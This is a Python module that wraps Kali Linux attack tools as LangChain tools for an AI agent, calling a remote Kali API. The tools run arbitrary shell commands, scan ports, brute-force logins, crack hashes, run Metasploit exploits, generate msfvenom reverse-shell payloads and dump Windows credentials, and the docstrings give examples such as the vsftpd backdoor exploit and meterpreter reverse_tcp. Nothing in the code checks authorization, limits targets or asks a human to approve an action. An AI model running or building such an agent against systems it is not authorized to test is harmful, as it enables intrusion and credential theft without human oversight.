"""LangChain tools that call the Kali FastAPI server directly over httpx.

Each tool is a plain async function wrapped with @tool.
Timeouts are enforced by httpx; the agent never sees timeout params.
"""

import logging
from typing import Any

import httpx
from langchain.tools import tool

from config import settings

logger = logging.getLogger("agent.tools")

_BASE_URL = "http://192.168.50.21:3000"
_DEFAULT_TIMEOUT = 300
_HARD_LIMIT_TIMEOUT = 3600
_TIMEOUT = getattr(settings.agent, "tool_timeout", _DEFAULT_TIMEOUT)


def _fmt(result: dict[str, Any], timeout: int = _TIMEOUT) -> str:
    """Format the API response into a readable string for the agent."""
    parts = []
    if result.get("timed_out"):
        parts.append(f"[TIMED OUT after {timeout}s — partial results below]")
    if result.get("stdout"):
        parts.append(result["stdout"])
    if result.get("stderr"):
        parts.append(f"[stderr]\n{result['stderr']}")
    if not parts:
        rc = result.get("return_code", "?")
        parts.append(f"[no output — return code {rc}]")
    return "\n".join(parts)


async def _api_post(endpoint: str, payload: dict[str, Any]) -> str:
    """POST to the Kali API and return a formatted string result."""
    actual_timeout = _TIMEOUT
    if actual_timeout > _HARD_LIMIT_TIMEOUT:
        actual_timeout = _HARD_LIMIT_TIMEOUT

    payload["timeout"] = actual_timeout
    httpx_timeout = actual_timeout + 10

    try:
        async with httpx.AsyncClient(base_url=_BASE_URL, timeout=httpx_timeout) as c:
            r = await c.post(endpoint, json=payload)
            r.raise_for_status()
            return _fmt(r.json(), timeout=actual_timeout)
    except httpx.TimeoutException:
        msg = f"TOOL TIMEOUT: {endpoint} did not respond within {httpx_timeout}s. Try a different approach."
        logger.warning(msg)
        return msg
    except httpx.ConnectError:
        msg = f"TOOL ERROR: could not connect to Kali API at {_BASE_URL}. The server may be down."
        logger.error(msg)
        return msg
    except httpx.HTTPStatusError as e:
        msg = f"TOOL ERROR: {endpoint} returned HTTP {e.response.status_code} — {e.response.text[:300]}"
        logger.error(msg)
        return msg
    except Exception as e:
        msg = f"TOOL ERROR: unexpected error calling {endpoint} — {type(e).__name__}: {e}"
        logger.error(msg, exc_info=True)
        return msg


# ──────────────────────────────────────────────────────────────────────
# Recon Tools
# ──────────────────────────────────────────────────────────────────────


@tool
async def kali_command(command: str) -> str:
    """Run a shell command on the remote Kali machine. Only for non-interactive commands that exit on their own (curl, dig, whois). Never use with nc/netcat."""
    return await _api_post("/api/tools/command", {"command": command})


@tool
async def nmap(target: str, scan_type: str = "-sCV", ports: str = "", additional_args: str = "-T4 -Pn") -> str:
    """Port scan and service detection. Example: nmap(target="10.0.0.1", ports="1-1000"). Use -sCV for version detection, -sU for UDP, -O for OS fingerprint."""
    return await _api_post("/api/tools/nmap", {"target": target, "scan_type": scan_type, "ports": ports, "additional_args": additional_args})


@tool
async def masscan(target: str, ports: str = "0-65535", rate: int = 1000, additional_args: str = "") -> str:
    """Fast port discovery across large ranges. Use this first, then nmap -sCV on found ports. Keep rate <= 1000."""
    return await _api_post("/api/tools/masscan", {"target": target, "ports": ports, "rate": rate, "additional_args": additional_args})


@tool
async def searchsploit(query: str, additional_args: str = "") -> str:
    """Search ExploitDB for public exploits. Query with service and version, e.g. 'vsftpd 2.3.4' or 'Apache 2.2'."""
    return await _api_post("/api/tools/searchsploit", {"query": query, "additional_args": additional_args})


@tool
async def whatweb(target: str, aggression: int = 1, additional_args: str = "") -> str:
    """Fingerprint web technologies (server, CMS, frameworks). Set aggression=3 for thorough detection."""
    return await _api_post("/api/tools/whatweb", {"target": target, "aggression": aggression, "additional_args": additional_args})


@tool
async def sslscan(target: str, additional_args: str = "") -> str:
    """Check SSL/TLS for weak ciphers and vulnerabilities (Heartbleed, POODLE). Target: host or host:port."""
    return await _api_post("/api/tools/sslscan", {"target": target, "additional_args": additional_args})


# ──────────────────────────────────────────────────────────────────────
# Web Tools
# ──────────────────────────────────────────────────────────────────────


@tool
async def gobuster(url: str, mode: str = "dir", wordlist: str = "/usr/share/wordlists/dirb/common.txt", additional_args: str = "") -> str:
    """Brute-force directories and files on a web server. Faster than dirb. Mode: 'dir', 'dns', or 'vhost'."""
    return await _api_post("/api/tools/gobuster", {"url": url, "mode": mode, "wordlist": wordlist, "additional_args": additional_args})


@tool
async def dirb(url: str, wordlist: str = "/usr/share/wordlists/dirb/common.txt", additional_args: str = "") -> str:
    """Brute-force directories on a web server. Use gobuster instead unless you need recursive scanning."""
    return await _api_post("/api/tools/dirb", {"url": url, "wordlist": wordlist, "additional_args": additional_args})


@tool
async def nikto(target: str, additional_args: str = "") -> str:
    """Scan a web server for misconfigurations, outdated software, and known vulnerabilities. Target: URL or host."""
    return await _api_post("/api/tools/nikto", {"target": target, "additional_args": additional_args})


@tool
async def sqlmap(url: str, data: str = "", additional_args: str = "") -> str:
    """Test a URL for SQL injection and dump data if vulnerable. Set data for POST requests (e.g. 'user=admin&pass=test')."""
    return await _api_post("/api/tools/sqlmap", {"url": url, "data": data, "additional_args": additional_args})


@tool
async def wpscan(url: str, additional_args: str = "") -> str:
    """Scan a WordPress site for vulnerable plugins, themes, and users."""
    return await _api_post("/api/tools/wpscan", {"url": url, "additional_args": additional_args})


# ──────────────────────────────────────────────────────────────────────
# Exploitation Tools
# ──────────────────────────────────────────────────────────────────────


@tool
async def metasploit(module: str, options: dict[str, Any] = {}) -> str:
    """Run a Metasploit module. Use for exploits and post-exploitation instead of nc/netcat. Example: metasploit(module="exploit/unix/ftp/vsftpd_234_backdoor", options={"RHOSTS": "10.0.0.1"})."""
    return await _api_post("/api/tools/metasploit", {"module": module, "options": options})


@tool
async def msfvenom(payload: str, lhost: str = "", lport: int = 4444, format: str = "elf", output: str = "/tmp/kali-loot/payload", additional_args: str = "") -> str:
    """Generate a payload file. Example: msfvenom(payload="linux/x86/meterpreter/reverse_tcp", lhost="10.0.0.2"). Format: elf=Linux, exe=Windows."""
    return await _api_post("/api/tools/msfvenom", {"payload": payload, "lhost": lhost, "lport": lport, "format": format, "output": output, "additional_args": additional_args})


# ──────────────────────────────────────────────────────────────────────
# Credential Tools
# ──────────────────────────────────────────────────────────────────────


@tool
async def hydra(target: str, service: str, username: str = "", username_file: str = "", password: str = "", password_file: str = "", additional_args: str = "") -> str:
    """Brute-force login credentials. Service: ssh, ftp, http-post-form, smb, etc. Provide username or username_file, and password or password_file."""
    return await _api_post("/api/tools/hydra", {"target": target, "service": service, "username": username, "username_file": username_file, "password": password, "password_file": password_file, "additional_args": additional_args})


@tool
async def john(hash_file: str, wordlist: str = "/usr/share/wordlists/rockyou.txt", format: str = "", additional_args: str = "") -> str:
    """Crack password hashes from a file. Auto-detects format, or specify: md5crypt, sha512crypt, etc."""
    return await _api_post("/api/tools/john", {"hash_file": hash_file, "wordlist": wordlist, "format": format, "additional_args": additional_args})


@tool
async def hashcat(hash_file: str, wordlist: str = "/usr/share/wordlists/rockyou.txt", hash_type: int = 0, attack_mode: int = 0, additional_args: str = "") -> str:
    """GPU-accelerated hash cracking. hash_type: 0=MD5, 1000=NTLM, 1800=sha512crypt. attack_mode: 0=dictionary, 3=brute-force."""
    return await _api_post("/api/tools/hashcat", {"hash_file": hash_file, "wordlist": wordlist, "hash_type": hash_type, "attack_mode": attack_mode, "additional_args": additional_args})


@tool
async def crackmapexec(protocol: str, target: str, username: str = "", username_file: str = "", password: str = "", password_file: str = "", additional_args: str = "") -> str:
    """Test credentials and enumerate services. Protocol: smb, ssh, winrm, ftp. Use additional_args='--shares' for SMB shares, '--users' for users."""
    return await _api_post("/api/tools/crackmapexec", {"protocol": protocol, "target": target, "username": username, "username_file": username_file, "password": password, "password_file": password_file, "additional_args": additional_args})


# ──────────────────────────────────────────────────────────────────────
# Post-Exploitation Tools
# ──────────────────────────────────────────────────────────────────────


@tool
async def enum4linux(target: str, additional_args: str = "-a") -> str:
    """Enumerate SMB/NetBIOS: shares, users, groups, OS info, password policy. Use -a for full enumeration."""
    return await _api_post("/api/tools/enum4linux", {"target": target, "additional_args": additional_args})


@tool
async def smbclient(target: str, share: str, username: str = "", password: str = "", command: str = "ls", additional_args: str = "") -> str:
    """Connect to an SMB share and run a command. Leave username/password empty for anonymous access. Commands: ls, get, put."""
    return await _api_post("/api/tools/smbclient", {"target": target, "share": share, "username": username, "password": password, "command": command, "additional_args": additional_args})


@tool
async def impacket(tool: str, target: str, username: str = "", password: str = "", domain: str = "", hash: str = "", additional_args: str = "") -> str:
    """Windows/AD attack tools. tool: secretsdump, psexec, smbexec, GetNPUsers, GetUserSPNs. Use hash for pass-the-hash (LM:NT format)."""
    return await _api_post("/api/tools/impacket", {"tool": tool, "target": target, "username": username, "password": password, "domain": domain, "hash": hash, "additional_args": additional_args})


@tool
async def linpeas(target_os: str = "linux") -> str:
    """Stage linpeas/winpeas in the loot directory. Returns the file path. Upload to target via Metasploit post/multi/manage/upload."""
    return await _api_post("/api/tools/linpeas", {"target_os": target_os})


# ──────────────────────────────────────────────────────────────────────
# Kali File Management
# ──────────────────────────────────────────────────────────────────────


@tool
async def kali_read_file(path: str) -> str:
    """Read a file on the remote Kali machine. Use for loot, hashes, configs. Path: absolute or relative to loot dir."""
    try:
        async with httpx.AsyncClient(base_url=_BASE_URL, timeout=_TIMEOUT + 5) as c:
            r = await c.get("/api/files/read", params={"path": path})
            r.raise_for_status()
            data = r.json()
            if data.get("encoding") == "base64":
                return f"[binary file — base64]\n{data['content']}"
            return data["content"]
    except httpx.HTTPStatusError as e:
        return f"TOOL ERROR: HTTP {e.response.status_code} — {e.response.text[:300]}"
    except Exception as e:
        return f"TOOL ERROR: {type(e).__name__}: {e}"


@tool
async def kali_list_files(path: str = "") -> str:
    """List files on the remote Kali machine. Defaults to loot directory. Use to browse Metasploit loot or captured files."""
    try:
        async with httpx.AsyncClient(base_url=_BASE_URL, timeout=_TIMEOUT + 5) as c:
            r = await c.get("/api/files/list", params={"path": path})
            r.raise_for_status()
            data = r.json()
            lines = [
                f"  {e['type'][0].upper()}  {e['name']}"
                + (f"  ({e['size']} bytes)" if e["size"] is not None else "")
                for e in data["entries"]
            ]
            return f"{data['path']}/\n" + ("\n".join(lines) if lines else "  (empty)")
    except httpx.HTTPStatusError as e:
        return f"TOOL ERROR: HTTP {e.response.status_code} — {e.response.text[:300]}"
    except Exception as e:
        return f"TOOL ERROR: {type(e).__name__}: {e}"


@tool
async def kali_upload_file(local_path: str, dest_path: str = "") -> str:
    """Copy a file on the Kali machine into the loot directory. local_path: source file, dest_path: optional destination name."""
    try:
        async with httpx.AsyncClient(base_url=_BASE_URL, timeout=_TIMEOUT + 5) as c:
            read_resp = await c.get("/api/files/read", params={"path": local_path})
            read_resp.raise_for_status()
            data = read_resp.json()
            content = data["content"].encode("utf-8")
            files = {"file": (local_path.split("/")[-1], content)}
            r = await c.post("/api/files/upload", files=files, data={"path": dest_path} if dest_path else {})
            r.raise_for_status()
            result = r.json()
            return f"Uploaded to: {result['path']} ({result['size']} bytes)"
    except httpx.HTTPStatusError as e:
        return f"TOOL ERROR: HTTP {e.response.status_code} — {e.response.text[:300]}"
    except Exception as e:
        return f"TOOL ERROR: {type(e).__name__}: {e}"


@tool
async def kali_delete_file(path: str) -> str:
    """Delete a file from the loot directory on the Kali machine."""
    try:
        async with httpx.AsyncClient(base_url=_BASE_URL, timeout=_TIMEOUT + 5) as c:
            r = await c.request("DELETE", "/api/files", params={"path": path})
            r.raise_for_status()
            result = r.json()
            return f"Deleted: {result['deleted']}"
    except httpx.HTTPStatusError as e:
        return f"TOOL ERROR: HTTP {e.response.status_code} — {e.response.text[:300]}"
    except Exception as e:
        return f"TOOL ERROR: {type(e).__name__}: {e}"


# ──────────────────────────────────────────────────────────────────────
# Tool Registry
# ──────────────────────────────────────────────────────────────────────


def get_tools() -> list:
    return [
        kali_command,
        nmap,
        masscan,
        searchsploit,
        whatweb,
        sslscan,
        gobuster,
        dirb,
        nikto,
        sqlmap,
        wpscan,
        metasploit,
        msfvenom,
        hydra,
        john,
        hashcat,
        crackmapexec,
        enum4linux,
        smbclient,
        impacket,
        linpeas,
        kali_read_file,
        kali_list_files,
        kali_upload_file,
        kali_delete_file,
    ]